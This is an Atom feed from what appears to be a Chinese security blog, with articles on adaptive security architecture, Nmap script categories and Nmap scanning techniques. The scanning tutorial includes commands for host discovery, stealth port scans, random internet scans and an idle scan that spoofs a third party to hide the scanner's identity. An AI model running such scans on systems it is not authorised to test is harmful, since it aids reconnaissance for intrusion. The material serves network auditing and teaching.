rel="noopener">CTF-Wiki Web篇</a></p></li><li><p><a href="https://paper.seebug.org/category/web-security/" target="_blank" rel="noopener">Seebug Paper-Web安全</a></p></li><li><p><a href="http://wiki.secbug.net/enterprise_web.html" target="_blank" rel="noopener">WooYun Wiki-WEB应用</a></p></li><li><p><a href="http://blog.nsfocus.net/web-vulnerability-analysis-coding-security/" target="_blank" rel="noopener">绿盟科技博客-安全分享</a></p></li><li><p><a href="https://pan.baidu.com/s/11s6gn5LCstLiU6u8koWWqg" target="_blank" rel="noopener">《XSS跨站脚本攻击》</a></p></li><li><p><a href="https://pan.baidu.com/s/1lpIFKMVDbpJOyAggA3bwpg" title="《白帽子讲Web安全》" target="_blank" rel="noopener">《白帽子讲Web安全》</a></p></li><li><p><a href="https://pan.baidu.com/s/1OJ_xK8TDa3jVWoHhQRb9Yw" target="_blank" rel="noopener">《SQL注入攻击与防御》</a></p></li></ul><ul><li><a href="https://pan.baidu.com/s/1ckkllzRAJdnEOHLSdQfovA" title="《黑客攻防技术宝典：Web实战篇》" target="_blank" rel="noopener">《黑客攻防技术宝典：Web实战篇》</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文对Web常用攻击手段与防御技术进行简要总结，涉及SQL注入与WAF防护，XSS攻击与防御，CSRF/SSRF原理及异同，越权漏洞及防御，文件上传漏洞，应用层DDOS等&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="Web安全" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WebSecurity" scheme="http://www.firehacker.top/tags/WebSecurity/"/>
    
      <category term="Injection" scheme="http://www.firehacker.top/tags/Injection/"/>
    
      <category term="XSS" scheme="http://www.firehacker.top/tags/XSS/"/>
    
      <category term="CSRF" scheme="http://www.firehacker.top/tags/CSRF/"/>
    
      <category term="SSRF" scheme="http://www.firehacker.top/tags/SSRF/"/>
    
      <category term="DDOS" scheme="http://www.firehacker.top/tags/DDOS/"/>
    
  </entry>
  
  <entry>
    <title>新型安全技术简析</title>
    <link href="http://www.firehacker.top/2018/09/07/%E6%96%B0%E5%9E%8B%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/09/07/新型安全技术简析/</id>
    <published>2018-09-07T01:27:15.000Z</published>
    <updated>2018-09-19T02:59:18.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>伴随大智云联的兴起与发展，自适应，微隔离，软件定义安全，加密流量分析，MLSec，下一代防火墙等新型安全概念层出不穷，这些安全技术的背景，兴起的原因，以及深层次的技术原理又是什么？本文综合网络上的相关资源，对此进行分析总结</p></blockquote><a id="more"></a><hr><h2 id="0x01-自适应安全架构-ASA"><a href="#0x01-自适应安全架构-ASA" class="headerlink" title="0x01 自适应安全架构(ASA)"></a>0x01 自适应安全架构(ASA)</h2><h3 id="1-阶段"><a href="#1-阶段" class="headerlink" title="1. 阶段"></a>1. 阶段</h3><p><img src="http://pdn6x28ho.bkt.clouddn.com/ASA%E6%9E%B6%E6%9E%84.jpg" alt=""></p><p><strong>(1) 预测 Predictive</strong></p><p>使安全系统可从外部监控下的黑客行动中学习，以主动锁定对现有系统和信息具有威胁的新型攻击，并对漏洞划定优先级和定位。该情报将反馈到预防和检测功能，从而构成整个处理流程的闭环</p><p><strong>(2) 防御 Preventive</strong></p><p>指一系列策略集、产品和服务可以用于防御攻击。这个方面的关键目标是通过减少被攻击面来提升攻击门槛，并在受影响前拦截攻击动作</p><p><strong>(3) 监控 Detective</strong></p><p>用于发现那些逃过防御网络的攻击，该方面的关键目标是降低威胁造成的“停摆时间”以及其他潜在的损失。检测能力非常关键，因为企业应该假设自己已处在被攻击状态中</p><p><strong>(4) 回溯 Restrospective</strong></p><p>用于高效调查和补救被检测分析功能(或外部服务)查出的事务，以提供入侵认证和攻击来源分析，并产生新的预防手段来避免未来事故</p><h3 id="2-核心思想"><a href="#2-核心思想" class="headerlink" title="2. 核心思想"></a>2. 核心思想</h3><p><strong>(1) 安全防护是一项持续处理过程</strong></p><p>在持续攻击时代，企业需要完成对安全思维的根本性切换，从“应急响应”到“持续响应”，前者认为攻击是偶发的，一次性的事故，而后者则认为攻击是不间断的，黑客渗透系统和信息的努力是不可能完全拦截的，系统应承认自己时刻处于被攻击中</p><p><strong>(2) 持续监控和分析是自适应安全架构的核心</strong></p><p>下一代安全防护程序的核心一定是持续的，主动监控和可视化将持续分析攻击痕迹，这将生成大量数据。可以用多种分析手段来处理这些数据，包括启发性方法、统计方法、推理建模、机器学习、聚类分析、贝叶斯建模</p><h3 id="3-关键输入"><a href="#3-关键输入" class="headerlink" title="3. 关键输入"></a>3. 关键输入</h3><p><img src="http://par628i4r.bkt.clouddn.com/%E8%BE%93%E5%85%A5.jpg" alt=""></p><p><strong>(1) 威胁情报</strong></p><p>危险情报的核心是那些提供可信有价值的主题源，如IP地址、域、URLs、文件、应用等等。然而，高级威胁情报服务还应提供给企业关于攻击者/机构的组织方式攻击目标等情报；服务商还应该提供相应的指导，帮助企业针对性防护这些攻击</p><p><strong>(2) 社区智慧</strong></p><p>为更好地应对高级威胁，信息应该是聚合的，可通过基于云的社区进行分析和分享的，理想的情况下，还应该拥有在相似行业和地区进行信息聚合及分析的能力。这种“众包”智能可以提升所有参与者的整体防护能力</p><p><strong>(3) 供应商实验室</strong></p><p>大多数安全防护平台厂商提供最新的信息来支持他们的防护解决方案——例如，为提供对最新发现的威胁进行保护，黑白名单以及规则和模式都会更新</p><p><strong>(4) 策略</strong></p><p>用于定义和描述各项组织需求包括系统配置、补丁需求、网络活动、哪些应用允许执行，哪些应被禁止，反病毒扫描的频率、敏感数据保护、应急响应等等</p><p><strong>(5) 漏洞分析</strong></p><p>该信息提供给企业对其所用到的设备、系统、应用和接口中的漏洞进行分析。除了包括一致的漏洞，分析还包括存在于企业客户和第三方应用中的一些未知的漏洞，可通过主动测试其应用、库和接口来完成</p><p><strong>(6) 场景</strong></p><p>基于当前条件的信息(如地点、时间、漏洞状态等)，场景感知使用额外信息提升信息安全决策正确性。对于分辨哪些攻击逃过传统安全防护机制，以及帮助确定有意义的偏离正常行为而不需要增加大量误报率时，对场景的利用非常关键</p><h3 id="4-关键功能"><a href="#4-关键功能" class="headerlink" title="4. 关键功能"></a>4. 关键功能</h3><p><img src="http://par628i4r.bkt.clouddn.com/%E5%8A%9F%E8%83%BD.jpg" alt=""></p><p><img src="http://par628i4r.bkt.clouddn.com/%E6%9E%B6%E6%9E%84.png" alt=""></p><p><strong>(1) 预测阶段</strong></p><ul><li><p><strong>基线系统</strong>：系统会不停地进行变动;新的系统(如移动设备和云服务)也将不断被引入;用户账户不停的新建和撤销;新的漏洞不断地披露;新应用部署;针对新威胁的适应改造也一直进行着，所以，我们也应该持续对终端设备、服务器端系统、云服务、漏洞、关系和典型接口进行重定基线以及挖掘发现</p></li><li><p><strong>攻击预测</strong>：该领域正处于前沿而且日益重要。通过检测黑客的意图，关注黑客市场和公告板;对垂直行业的兴趣;以及对保护信息的类别和敏感度，这一领域内的功能在于主动预测未来的攻击和目标，使企业可以随之调整安全防护策略来应对</p></li><li><p><strong>主动探索分析</strong>：随着内外情报的收集，需要对企业资产进行探索和风险评估以预测威胁，同时也许需要对企业策略和控制的调整</p></li></ul><p><strong>(2) 防护阶段</strong></p><ul><li><strong>加固和隔离系统：</strong>任何信息安全架构的初始功能都是采用多种技术降低攻击面，限制黑客接触系统、发现漏洞和执行恶意代码的能力</li></ul><ul><li><p><strong> 漏洞以及补丁管理</strong>：用于识别和关闭漏洞的漏洞及路径管理功能也可以纳入此类。结合端点隔离和沙盒技术，可主动限制网络/系统/进程/应用相互接口的能力，也是此类的另一种方式(见“面向高级攻击的虚拟化和控制系统技术概览”)</p></li><li><p><strong>转移攻击：</strong>简单来说，该领域功能可是企业在黑客攻防中获得时间上的非对称优势，通过多种技术使攻击者难以定位真正的系统核心以及可利用漏洞，以及隐藏\混淆系统接口\信息(如创建虚假系统、漏洞和信息)</p></li></ul><p><strong>(3) 检测阶段</strong></p><p>-<strong> 事故预防</strong>：该类别覆盖多种成熟的预防方式防止黑客未授权而进入系统，包括传统的“黑白名单式”的反恶意病毒扫描以及基于网络\主机的入侵预防系统。“行为特征” 也是这方面的另一层应用——例如，为防止系统和控制中心交流，可使用来自第三方知名发布的服务信息和情报并整合进入网络、网管或者基于主机的控制器</p><ul><li><strong>事故检测</strong>：一些攻击者不可避免地会绕过传统的拦截和预防机制，这时最重要的事情就是在尽可能短的时间里检测到入侵，将黑客造成损害和泄露敏感的信息最小化</li></ul><p>-<strong> 风险确认和排序</strong>：一旦潜在问题被检测到，就需要在不同实体中将攻击的标志关联起来进行确认，例如，首先观察在沙盒环境中基于网络的威胁检测系统所观察到进程、行为和注册实体等，然后将其和实际端口中的情况相比</p><p><strong>(4) 回溯分析</strong></p><ul><li><p><strong>事故隔离</strong>：一旦事故被识别、确认和排序，这个类别的工作将迅速隔离被感染系统和账户，防止其阻碍其他系统。常用的隔离能力包括，端点隔离、账户封锁、网络层隔离、系统进程关闭，以及立即预防其他系统执行同样的恶意软件或访问同样的被感染信息</p></li><li><p><strong>调查/取证</strong>：当被感染的系统和账户被隔离好之后，通过回顾分析事件完整过程，利用持续监控所获取的数据，根本原因和全部缺口都终将解决</p></li><li><p><strong>设计/模式改变</strong>：为预防新攻击或系统重受感染，需要更改某些策略和控制——例如，关闭漏洞、关闭网络端口、特征升级、系统配置升级、用户权限修改、用户培训修改或者提升信息防护选项的强度</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;伴随大智云联的兴起与发展，自适应，微隔离，软件定义安全，加密流量分析，MLSec，下一代防火墙等新型安全概念层出不穷，这些安全技术的背景，兴起的原因，以及深层次的技术原理又是什么？本文综合网络上的相关资源，对此进行分析总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全前沿" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E5%89%8D%E6%B2%BF/"/>
    
    
      <category term="ASA" scheme="http://www.firehacker.top/tags/ASA/"/>
    
      <category term="SeeSec" scheme="http://www.firehacker.top/tags/SeeSec/"/>
    
  </entry>
  
  <entry>
    <title>NSE脚本浅析</title>
    <link href="http://www.firehacker.top/2018/09/03/NSE%E8%84%9A%E6%9C%AC%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/09/03/NSE脚本浅析/</id>
    <published>2018-09-03T13:32:04.000Z</published>
    <updated>2018-10-24T07:01:31.019Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://nmap.org/book/nse.html" target="_blank" rel="noopener">NSE</a>(Nmap 脚本引擎)是Nmap最强大最灵活的特性之一，可以用于增强主机发现、端口扫描、版本侦测和操作系统侦测等功能，还可以用来扩展高级的功能如web扫描、漏洞发现和漏洞利用等。本文对NSE技术及Lua语言进行分析与总结</p></blockquote><a id="more"></a><hr><h2 id="0x01-NSE-基础"><a href="#0x01-NSE-基础" class="headerlink" title="0x01 NSE 基础"></a>0x01 NSE 基础</h2><h3 id="1-NSE-脚本运行"><a href="#1-NSE-脚本运行" class="headerlink" title="1. NSE 脚本运行"></a>1. NSE 脚本运行</h3><pre><code>Namp -sV -sC scanme.Nmap.org</code></pre><p>-sV：对目标系统上的服务进行检测</p><p>-sC：使用默认(default)分类中所有脚本对目标进行检测</p><p><strong>Default 分类中的脚本</strong></p><table><thead><tr><th>脚本</th><th>描述</th></tr></thead><tbody><tr><td>banner.NSE</td><td>收集目标banner信息，会连接到目标开放TCP端口，输出任何5s内收到的数据</td></tr><tr><td>broadcast-ping.NSE</td><td>使用广播ping来发现网络中的主机</td></tr><tr><td>dns-recursion.NSE</td><td>检测一个DNS服务器是否允许第三方的查询，允许此查询可导致服务器受到DNS放大攻击</td></tr><tr><td>upnp-info.NSE</td><td>尝试通过UPnP服务来提取系统信息</td></tr><tr><td>Firewalk.NSE</td><td>使用IP协议中的TTL过期机制来发现防火墙设备</td></tr></tbody></table><h3 id="2-NSE-脚本分类"><a href="#2-NSE-脚本分类" class="headerlink" title="2. NSE 脚本分类"></a>2. NSE 脚本分类</h3><table><thead><tr><th>分类</th><th>描述</th></tr></thead><tbody><tr><td>auth</td><td>负责处理鉴权证书的脚本</td></tr><tr><td>broadcast</td><td>在局域网内探查更多服务开启状况，如CHCP,DNS，SQL Server等服务</td></tr><tr><td>brute</td><td>暴力破解密码脚本</td></tr><tr><td>default</td><td>使用-sC或-A参数扫描时默认脚本，提供基本脚本扫描能力</td></tr><tr><td>discovery</td><td>网络信息收集脚本，如SMB枚举，SNMP查询</td></tr><tr><td>dos</td><td>用于发起拒绝服务攻击</td></tr><tr><td>exploit</td><td>用来完成对目标系统安全漏洞渗透</td></tr><tr><td>external</td><td>针对第三方服务的脚本</td></tr><tr><td>fuzzer</td><td>进行模糊测试的脚本，发送异常包到目标机，探测出潜在漏洞</td></tr><tr><td>instrusive</td><td>可能引起目标系统崩溃或对目标网络造成极大负担的脚本</td></tr><tr><td>malware</td><td>用于检测恶意软件</td></tr><tr><td>safe</td><td>任何情况下安全无害的脚本</td></tr><tr><td>version</td><td>负责增强服务和版本扫描</td></tr><tr><td>vuln</td><td>检查目标主机是否有常见漏洞</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://nmap.org/book/nse.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;NSE&lt;/a&gt;(Nmap 脚本引擎)是Nmap最强大最灵活的特性之一，可以用于增强主机发现、端口扫描、版本侦测和操作系统侦测等功能，还可以用来扩展高级的功能如web扫描、漏洞发现和漏洞利用等。本文对NSE技术及Lua语言进行分析与总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全工具" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="SecTools" scheme="http://www.firehacker.top/tags/SecTools/"/>
    
      <category term="Nmap" scheme="http://www.firehacker.top/tags/Nmap/"/>
    
      <category term="NSE" scheme="http://www.firehacker.top/tags/NSE/"/>
    
  </entry>
  
  <entry>
    <title>Nmap扫描详解</title>
    <link href="http://www.firehacker.top/2018/09/02/Nmap%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.firehacker.top/2018/09/02/Nmap技术详解/</id>
    <published>2018-09-02T06:55:31.000Z</published>
    <updated>2018-09-19T03:05:27.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文参考<a href="http://www.tup.tsinghua.edu.cn/bookscenter/book_07230301.html" target="_blank" rel="noopener">诸神之眼</a>，由浅入深剖析Nmap进行网络安全审计技术，涉及活跃主机发现，端口扫描，远程操作系统和服务检测等技术</p></blockquote><a id="more"></a><hr><h2 id="0x01-Nmap-扫描范围"><a href="#0x01-Nmap-扫描范围" class="headerlink" title="0x01 Nmap 扫描范围"></a>0x01 Nmap 扫描范围</h2><h3 id="1-对连续范围内主机进行扫描"><a href="#1-对连续范围内主机进行扫描" class="headerlink" title="1. 对连续范围内主机进行扫描"></a>1. 对连续范围内主机进行扫描</h3><p><em>命令语法：Nmap [IP地址范围]</em></p><p>扫描范围为192.168.0.1~192.168.0.255 的主机</p><pre><code>Nmap -sn 192.168.0.1-255</code></pre><h3 id="2-对整个子网进行扫描"><a href="#2-对整个子网进行扫描" class="headerlink" title="2. 对整个子网进行扫描"></a>2. 对整个子网进行扫描</h3><p>Nmap 使用 <strong>CIDR</strong> (Classless Inter-Domain Routing，无类别域间路由)方式扫描整个子网</p><p><em>命令语法：Nmap [IP地址/掩码位数]</em></p><p>扫描范围为192.168.0.1~192.168.0.255子网范围内的主机</p><pre><code>Nmap -sn 192.168.0.1/24</code></pre><h3 id="3-对多个不连续的主机进行扫描"><a href="#3-对多个不连续的主机进行扫描" class="headerlink" title="3. 对多个不连续的主机进行扫描"></a>3. 对多个不连续的主机进行扫描</h3><p>将目标地址用空格分隔开来同时扫描选定主机</p><p><em>语法命令：Nmap [扫描目标1 扫描目标2 … 扫描目标n]</em></p><p>对192.168.0.1，192.168.2.1，192.168.128.1进行扫描</p><pre><code>Nmap -sn 192.168.0.1 192.168.2.1 192.168.128.1</code></pre><h3 id="4-排除指定目标扫描主机"><a href="#4-排除指定目标扫描主机" class="headerlink" title="4. 排除指定目标扫描主机"></a>4. 排除指定目标扫描主机</h3><p><em>命令语法：Nmap [目标] –exclude [目标]</em></p><p>扫描192.168.0.0/24 子网时，不对192.168.0.2进行扫描</p><pre><code>Nmap -sn 192.168.0.0/24 --exclude 192.168.0.2</code></pre><h3 id="5-对文本文件中的地址进行扫描"><a href="#5-对文本文件中的地址进行扫描" class="headerlink" title="5. 对文本文件中的地址进行扫描"></a>5. 对文本文件中的地址进行扫描</h3><p><em>命令语法：Nmap -iL [文本文件]</em></p><p>使用命令对 list.txt 中的地址进行扫描</p><pre><code>Nmap -sn -iL list.txt</code></pre><p><em>-sn 选项：快速扫描，仅确定目标是否是存活主机</em></p><h3 id="6-随机确定扫描目标"><a href="#6-随机确定扫描目标" class="headerlink" title="6. 随机确定扫描目标"></a>6. 随机确定扫描目标</h3><p><em>命令语法：Nmap -iR [目标数量]</em></p><p>随机在互联网上对80个IP地址进行扫描</p><pre><code>Nmap -sn -iR 80</code></pre><hr><h2 id="0x02-活跃主机发现"><a href="#0x02-活跃主机发现" class="headerlink" title="0x02 活跃主机发现"></a>0x02 活跃主机发现</h2><h3 id="1-基于APR协议"><a href="#1-基于APR协议" class="headerlink" title="1. 基于APR协议"></a>1. 基于APR协议</h3><p><strong>(1) 原理</strong></p><p>若想知道处在<strong>同一网段</strong>中IP地址为#.#.#.#的主机是否为活跃主机，先构造一个ARP请求数据包，并广播出去，如果得到回应，则说明该主机为活跃主机</p><p><strong>(2) Nmap 选项</strong></p><p><em>命令语法：Nmap -PR [目标]</em></p><p><strong>工作原理</strong></p><p>A. 将一个内容为 ‘<em>who has IP_2 tell IP_1</em>‘ 的 ARP 请求发送给目标 （Type：ARP(0x0806)；Opcode：request(1)）</p><p>B. 如果目标主机发出相应ARP回应’<em>ARP reply IP_2 is at MAC_2</em>‘ （Type：ARP(0x0806)；Opcode：reply(2)）</p><p>C. 如果迟迟得不到ARP响应数据包，可认为该IP地址所在设备不是活跃主机</p><h3 id="2-基于ICMP协议"><a href="#2-基于ICMP协议" class="headerlink" title="2. 基于ICMP协议"></a>2. 基于ICMP协议</h3><p><strong>(1) ICMP协议解析</strong></p><p>ICMP协议目的是在IP主机，路由器之间传递控制消息，发现和处理互联网的各种错误；ICMP报文可分为差错和查询两类，查询报文是用一对请求和应答定义的，可分为如下3类</p><p>A. <strong>响应请求和应答</strong></p><p>用于测试发送和接收两端链路及目标主机TCP/IP协议是否正常，只要收到就是正常，例如ping命令</p><p>B. <strong>时间戳请求和应答</strong></p><p>ICMP时间戳请求允许系统向另一个系统查询当前的时间，根据应答判断主机是否在线</p><p>C. <strong>地址掩码请求和应答</strong></p><p>ICMP地址掩码请求由源主机发送，用于无盘系统在引导过程中获取自己的子网掩码</p><p><strong>(2) 主机发现</strong></p><p>A. <strong>通过ICMP响应请求和应答进行主机发现</strong></p><p>由于ping工具的滥用，多数用于防护主机的防火墙设备都隔绝ICMP数据包通过，使用Nmap的选项-PE可实现ICMP协议的主机发现</p><p><em>命令语法：Nmap -PE [选项]</em></p><pre><code>Nmap -sn -PE 192.168.0.1</code></pre><p>主机向目标发送一个ICMP echo请求包，结果中的 <em>Type：8 (Echo (ping) request)</em>；若对方主机在线，而且没有防火墙隔离通信，将会收到目标主机但会的ICMP echo 响应数据包，<br><em>Type: 0 (Echo (ping) reply)</em></p><p>B. <strong>通过ICMP时间戳请求和应答进行主机发现</strong></p><p><em>命令语法：Nmap -PP [选项]</em></p><pre><code>Nmap -sn -PP 192.168.0.1</code></pre><p>发送的数据包Type字段为 <em>Type：13 (Timestamp request)</em>；目标主机在获得这个数据包之后，返回 <em>Type：14 (Timestamp reply)</em> 的响应数据包</p><p>C. 通过ICMP地址掩码请求和应答进行主机发现</p><p><em>命令语法：Nmap -PM [目标]</em></p><p>发送的数据包 Type 字段为 <em>Type：17(Address mask request)</em> ，实际中多用于无盘系统</p><h3 id="3-基于TCP协议"><a href="#3-基于TCP协议" class="headerlink" title="3. 基于TCP协议"></a>3. 基于TCP协议</h3><p><strong>(1)TCP协议解析</strong></p><p>TCP 是一种面向连接，可靠的，基于字节流的传输控制协议，使用三次握手协议建立连接。当主动方发出 SYN 连接请求后，等待对方回答TCP的三次握手 SYN+ACK ，并最终对对方的SYN执行ACK确认</p><p><strong>TCP三次握手过程</strong></p><pre><code>1. 客户端发送SYN(SEQ=x)报文给服务端，进入SYN_SEND状态2. 服务端接收SYN报文，回应一个SYN(SEQ=y) ACK(ACK=x+1) 报文，进入SYN_RECV状态3. 客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1)报文，进入Established状态</code></pre><p><strong>(2) 主机发现</strong></p><p>A. <strong>TCP SYN扫描</strong></p><p><em>命令语法：Nmap -PS [端口1，端口2，…] [目标]</em></p><p>使用-PS选项想目标主机发送一个设置了SYN标志的数据包，内容部分为空。默认目标端口为80端口</p><p>目标主机收到Nmap发送的SYN数据包之后，认为其要和自己的一个端口建立连接，如果端口开放，目标主机会按照三次握手规定，返回一个SYN/ACK数据包，表示同意连接</p><p>如果端口关闭，目标主机会拒绝此次连接，向Nmap所在主机发送一个RST数据包</p><p>主机发现阶段，只要收到数据包，无论是SYN/ACK数据包还是RST数据包，意味目标主机活跃</p><p>B. <strong>TCP ACK扫描</strong></p><p>Nmap发送的数据包中使用TCP/ACK标志位，不是SYN标志位</p><p><em>命令语法：Nmap -PA [目标]</em></p><h3 id="4-基于UDP协议"><a href="#4-基于UDP协议" class="headerlink" title="4. 基于UDP协议"></a>4. 基于UDP协议</h3><p><strong>(1) UDP 协议解析</strong></p><p>UDP协议面向非连接，端口扫描可靠性不高；当一个UDP端口收到一个UDP数据包时，如果它是<strong>关闭</strong>的，会给源端返回一个<strong>ICMP端口不可达数据包</strong>；如果它是开放的，就会忽略此数据包，将其丢弃不反悔任何信息(可能是传输过程中数据包丢失，扫描时间超过限制)</p><p><strong>(2) 主机发现</strong></p><p><em>命令语法：Nmap -PU [目标]</em></p><p>UDP需要扫描的是目标主机关闭的端口，扫描过程需要避开常用UDP协议端口，选用比较大的端口</p><h3 id="5-基于SCTP协议"><a href="#5-基于SCTP协议" class="headerlink" title="5. 基于SCTP协议"></a>5. 基于SCTP协议</h3><p><strong>(1) SCTP协议解析</strong></p><p>SCTP与TCP同为传输层上的协议，完成任务相同，差别对别如下</p><p>A. TCP协议一般用于单地址连接，SCTP可用于多地址连接</p><p>B. TCP协议基于字节流，支持一个流；SCTP协议基于消息流，可支持多个流</p><p>C. TCP连接的建立通过三次握手实现，SCTP连接建立通过四次握手机制实现，可有效避免攻击</p><p>在STCP中，客户端使用一个<code>INIT</code>报文发起连接，服务器端使用<code>INIT-ACK</code>报文进行应答，其中包括<code>cookie</code>(连接的唯一标识)。然后客户端使用一个<code>COOKIE-ECHO</code>报文进行响应，其中包含服务气短所发送的cookie。服务器端要为这个链接分配资源，并通过向客户端发送一个<code>COOKIE-ACK</code>报文对其进行响应</p><p><strong>(2) 主机发现</strong></p><p><em>命令语法：Nmap -PY [端口1，端口2，…] [目标]</em></p><p>多数目标主机不支持SCTP协议，此方法作为备用手段</p><h3 id="6-基于IP协议"><a href="#6-基于IP协议" class="headerlink" title="6. 基于IP协议"></a>6. 基于IP协议</h3><p>Nmap中允许想目标主机发送IP数据包来检测目标主机是否活跃，可用<code>-PO</code>选项制定协议编号进行扫描，默认为ICMP-1，IGMP-2，IP-in-IP-4，TCP-6，UDP-17，GRE-47，ESP-50</p><p><em>命令语法：Nmap -sP -PO 协议编号 [目标]</em></p><p>此情形数据包内容为空，容易被检测，可使用–data-length参数来发送添加了随机数据的数据包</p><pre><code>Nmap --data-length 25 192.168.0.1</code></pre><h3 id="7-基于DNS协议"><a href="#7-基于DNS协议" class="headerlink" title="7. 基于DNS协议"></a>7. 基于DNS协议</h3><p>将所有目标IP(无论是否活跃)对应的域名列出</p><p><em>命令语法：Nmap -R [目标IP]</em></p><p>取消域名转换，适用于大规模网络扫描</p><p><em>命令语法：Nmap -n [目标IP]</em></p><hr><h2 id="0x03-端口扫描技术"><a href="#0x03-端口扫描技术" class="headerlink" title="0x03 端口扫描技术"></a>0x03 端口扫描技术</h2><h3 id="1-SYN-扫描"><a href="#1-SYN-扫描" class="headerlink" title="1. SYN 扫描"></a>1. SYN 扫描</h3><p>Nmap 默认扫描方式，扫描速度快，不易被网络安全设备发现</p><pre><code>1. Nmap想目标主机的一个端口发送请求连接的SYN数据包2. 目标计算机在接收这个SYN数据包之后会以SYN/ACK进行应答3. Nmap在收到SYN/ACK后发送RST包请求断开连接而不是ACK应答</code></pre><p>三四握手没有完成，无法建立正常的TCP连接，扫描不会被记录到系统日志中</p><p><em>扫描语法：nmap -sS [target]</em></p><h3 id="2-Connect扫描"><a href="#2-Connect扫描" class="headerlink" title="2. Connect扫描"></a>2. Connect扫描</h3><p><em>语法：nmap -sT [target]</em></p><p>这种扫描方式完成了TCP三次握手，无需rooy/administrator 权限</p><h3 id="3-UDP-扫描"><a href="#3-UDP-扫描" class="headerlink" title="3. UDP 扫描"></a>3. UDP 扫描</h3><p><em>语法：nmap -sU [target]</em></p><p>UDP 扫描速度较慢，UDP程序不会对Nmap所发送的空数据包做出回应</p><h3 id="4-TCP-FIN-扫描"><a href="#4-TCP-FIN-扫描" class="headerlink" title="4. TCP FIN 扫描"></a>4. TCP FIN 扫描</h3><p><em>语法：nmap -sF [target]</em></p><p>TCP FIN 扫描方法向目标端口发送一个FIN数据包，对于关闭的端口，目标系统返回RST标志</p><h3 id="5-NULL-扫描"><a href="#5-NULL-扫描" class="headerlink" title="5. NULL 扫描"></a>5. NULL 扫描</h3><p><em>语法：nmap -sN [target]</em></p><p>TCP NULL 扫描方法向目标端口发送一个不包含任何标志的数据包，对于关闭的端口，目标系统返回RST标志</p><h3 id="6-Xmas-Tree-扫描"><a href="#6-Xmas-Tree-扫描" class="headerlink" title="6. Xmas Tree 扫描"></a>6. Xmas Tree 扫描</h3><p><em>语法：nmap -sX [target]</em></p><p>TCP Xmas Tree 扫描方法是向目标端口发送一个含有FIN,URG,PUSH 标志的数据包，对于关闭的端口，目标系统返回RST标志</p><h3 id="7-idle-扫描"><a href="#7-idle-扫描" class="headerlink" title="7. idle 扫描"></a>7. idle 扫描</h3><p>伪造一个源地址为第三方的数据包，可以帮助使用者隐藏自己的身份，目标主机日志中记录下来的是第三方地址</p><p>可以绕开网络中的一些安全机制，如路由器中的访问控制列表(ACL)</p><p><strong>扫描原理</strong></p><pre><code>1. 检测第三方的IP ID 值并记录下来2. 在本机上伪造一个源地址为第三方主机的数据包，将其发送给目标主机端口，根据端口状态的不同，目标主机可能会导致第三方主机IP ID值增加3. 再回来检查第三方主机的IP ID值，比较两次值</code></pre><p>如果第三方IP ID值增加了1，说明在此期间没有向外发送数据包，则目标主机端口关闭；如果增加了2，说明再次期间第三方主机向外发送了数据包，则目标主机端口开放</p><pre><code>Nmap -Pn -p- -sI A B</code></pre><p>使用sI参数指定A作为第三方主机，然后对B进行扫描</p><h3 id="8-指定扫描端口"><a href="#8-指定扫描端口" class="headerlink" title="8. 指定扫描端口"></a>8. 指定扫描端口</h3><pre><code>1. 扫描常见的100个端口    nmap -F [target]2. 指定某一个端口    nmap -p [port] [target]3. 使用名字来指定扫描端口    nmap -p [port name(s)] [target]4. 使用协议指定扫描端口    nmap -p U:[UDP ports]，T:[TCP ports] [target]5. 扫描所有端口    nmap -p * [target]6. 扫描常用端口    nmap --top-ports [number] [target]</code></pre><hr><h2 id="0x04-系统与服务检测"><a href="#0x04-系统与服务检测" class="headerlink" title="0x04 系统与服务检测"></a>0x04 系统与服务检测</h2><h3 id="1-操作系统判断"><a href="#1-操作系统判断" class="headerlink" title="1. 操作系统判断"></a>1. 操作系统判断</h3><p>通过向目标发送探针，然后根据目标的回应来猜测系统，进行识别的探针和响应对应的关系保存在Nmap-os-db文件中</p><p><em>nmap -O [target]</em></p><p>猜测最接近目标的匹配操作系统类型</p><pre><code>nmap -sV -F --fuzzy --oscan-guess 目标IP</code></pre><h3 id="2-服务及版本发现"><a href="#2-服务及版本发现" class="headerlink" title="2. 服务及版本发现"></a>2. 服务及版本发现</h3><p>版本检测程序会将探测结果与<code>Nmap-service-probes</code>数据库中的内容进行比较，如果匹配成功，就可以确认目标端口运行的具体服务</p><pre><code>-sV(版本探测)--allports(不为版本探测排除任何端口)--version-intensity &lt;intensity&gt; (设置版本扫描强度)--version-light(打开轻量级模式，扫描速度加快)--version-all(尝试每个探测)--version-trace(跟踪版本扫描活动)-sR(RPC扫描)</code></pre><hr><h2 